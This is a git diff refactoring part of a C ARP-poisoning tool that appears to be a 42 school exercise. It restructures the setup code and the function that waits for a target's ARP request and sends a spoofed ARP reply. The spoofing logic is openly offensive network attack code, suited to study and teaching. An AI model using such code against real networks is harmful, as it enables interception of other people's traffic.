@@ -6,7 +6,7 @@
 /*   By: vgoncalv <vgoncalv@student.42sp.org.br>    +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2024/06/21 16:21:24 by vgoncalv          #+#    #+#             */
-/*   Updated: 2024/06/28 11:02:42 by vgoncalv         ###   ########.fr       */
+/*   Updated: 2024/07/02 17:51:49 by vgoncalv         ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -15,6 +15,7 @@
 #include <libft.h>
 #include <linux/if_packet.h>
 #include <net/if.h>
+#include <net/if_arp.h>
 #include <netinet/ether.h>
 #include <netinet/in.h>
 #include <stdio.h>
@@ -23,25 +24,17 @@
 #include <sys/socket.h>
 #include <unistd.h>
 
-t_poison	*poison_create(void)
+void	poison_init(t_poison *poison)
 {
-	t_poison	*poison;
-
-	poison = ft_calloc(1, sizeof(t_poison));
-	if (poison == NULL)
-	{
-		error(strerror(errno));
-		return (NULL);
-	}
-	poison->iface.sock_fd = -1;
-	return (poison);
+	*poison = (t_poison){
+		.iface.sock_fd = -1,
+	};
 }
 
 void	poison_destroy(t_poison *poison)
 {
 	if (poison->iface.sock_fd != -1)
 		close(poison->iface.sock_fd);
-	free(poison);
 }
 
 int	poison_bind_interface(t_poison *poison)
@@ -95,11 +88,11 @@ int	poison_listen(t_poison *poison)
 			error("Failed to read ARP packet: %s", strerror(errno));
 			return (1);
 		}
-		if (read > 0 && is_arp_request(packet) && is_poison_target(poison, &packet))
+		if (read > 0 && is_arp_request(&packet) && is_poison_target(poison, &packet))
 		{
 			printf("Received target ARP request\n");
 			if (poison->verbose)
-				print_arp_packet(packet);
+				print_arp_packet(&packet);
 			return (0);
 		}
 		usleep(100);
@@ -108,29 +101,18 @@ int	poison_listen(t_poison *poison)
 
 int	poison_attack(t_poison *poison)
 {
-	int					res;
-	struct sockaddr_ll	addr;
-	t_arp_packet		packet;
+	t_arp_packet	packet;
 
-	if (poison->gratuitous)
-		packet = create_gratuitous_arp_broadcast(&poison->source);
-	else
-		packet = create_arp_reply(&poison->source, &poison->target);
-	ft_bzero(&addr, sizeof(struct sockaddr_ll));
-	addr.sll_family = AF_PACKET;
-	addr.sll_ifindex = poison->iface.index;
-	addr.sll_halen = ETHER_ADDR_LEN;
-	addr.sll_protocol = htons(ETH_P_ARP);
-	ft_memcpy(addr.sll_addr, poison->target.mac, ETHER_ADDR_LEN);
-	res = sendto(poison->iface.sock_fd, &packet, sizeof(t_arp_packet), 0,
-			  (struct sockaddr *)&addr, sizeof(struct sockaddr_ll));
-	if (res == -1)
+	if (!poison->gratuitous)
 	{
-		error("Failed to send ARP packet: %s", strerror(errno));
-		return (1);
+		printf("Waiting for target ARP request\n");
+		if (poison_listen(poison) != 0)
+			return (1);
 	}
-	printf("Sent spoofed ARP reply\n");
+	packet = create_arp_packet(ARPOP_REPLY, &poison->source, &poison->target);
+	if (send_arp_packet(poison, &packet))
+		return (1);
 	if (poison->verbose)
-		print_arp_packet(packet);
+		print_arp_packet(&packet);
 	return (0);
 }
